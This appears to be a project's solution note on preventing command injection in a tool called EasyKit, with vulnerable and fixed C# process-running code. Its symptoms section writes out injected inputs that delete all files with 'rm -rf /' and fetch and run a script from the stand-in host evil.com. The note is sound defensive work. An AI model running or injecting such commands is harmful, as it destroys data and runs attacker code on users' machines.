# Command Injection Prevention

**Date:** 2025-09-09  
**Type:** Solution  
**Status:** Current

## Problem

EasyKit executes external commands based on user input. Without proper sanitization, attackers could inject arbitrary commands.

## Symptoms

Before the fix, the following attack vectors existed:

1. **Git commit message injection:**
   ```
   User enters: "feature; rm -rf /"
   Command becomes: git commit -m "feature; rm -rf /"
   Result: Deletes all files
   ```

2. **npm script injection:**
   ```
   User enters: "install && curl evil.com/script.sh | bash"
   Command becomes: npm run install && curl evil.com/script.sh | bash
   Result: Downloads and executes malicious script
   ```

3. **Composer package injection:**
   ```
   User enters: "require vendor/package; wget evil.com"
   Command becomes: composer require vendor/package; wget evil.com
   Result: Downloads malicious file
   ```

## Root Cause

Using string concatenation for command arguments:
```csharp
// VULNERABLE
string command = $"git commit -m \"{message}\"";
Process.Start("cmd", $"/c {command}");
```

## Solution

### 1. SecureProcessRunner Implementation

```csharp
public class SecureProcessRunner
{
    private readonly HashSet<string> _allowedCommands = new(StringComparer.OrdinalIgnoreCase)
    {
        "git", "npm", "pnpm", "corepack", "composer", "php", "laravel",
        "uv", "python", "pip", "dotnet", "docker", "node",
        "where", "which", "choco", "nuget", "echo", "type", "dir", "copy"
    };

    private readonly HashSet<char> _dangerousChars = new()
    { '`', '|', '&', '$', '(', ')', '{', '}', '[', ']', '!', '#', '%', '^', '<', '>', ';', '+', '=' };

    public (string output, string error, int exitCode) RunProcess(
        string command,
        IEnumerable<string> arguments,
        string? workingDirectory = null)
    {
        ValidateCommand(command);
        ValidateArguments(arguments);
        
        var resolvedCommand = ResolveCommand(command);
        
        var psi = new ProcessStartInfo
        {
            FileName = resolvedCommand,
            Arguments = BuildSafeArguments(arguments),
            UseShellExecute = false,
            CreateNoWindow = true
        };
        
        // Execute with argument arrays, not string concatenation
        using var process = Process.Start(psi);
        // ...
    }
}
```

### 2. Controller Migration

All controllers migrated to use SecureProcessRunner:

```csharp
// BEFORE (VULNERABLE)
private void Commit(string message)
{
    _processService.RunCommand("git", $"commit -m \"{message}\"");
}

// AFTER (SECURE)
private void Commit(string message)
{
    var result = _processRunner.RunProcess("git", new[] { "commit", "-m", message });
}
```

### 3. Input Validation

Added regex validation for user inputs:

```csharp
// Script names
if (!Regex.IsMatch(script, @"^[a-zA-Z0-9_\-:]+$"))
    throw new SecurityException("Invalid script name");

// Package names
if (!Regex.IsMatch(package, @"^[a-zA-Z0-9_\-/.]+$"))
    throw new SecurityException("Invalid package name");
```

## Why It Works

1. **Argument arrays** prevent shell interpretation of special characters
2. **Command whitelist** ensures only known-safe commands execute
3. **Dangerous character detection** blocks injection attempts
4. **Path traversal prevention** blocks directory escape attempts

## Verification

- 48 unit tests covering security scenarios
- All tests pass
- Security audit completed

## Constraints

- Windows executable resolution required (`.exe`, `.cmd`, `.bat`, `.ps1`)
- Timeout handling for long-running commands
- Cancellation support for interactive operations

## Evidence

- Commit: `dd4ca70`
- Files modified: 9
- Tests added: 48
- Audit report: `reports/comprehensive-audit-report.md`
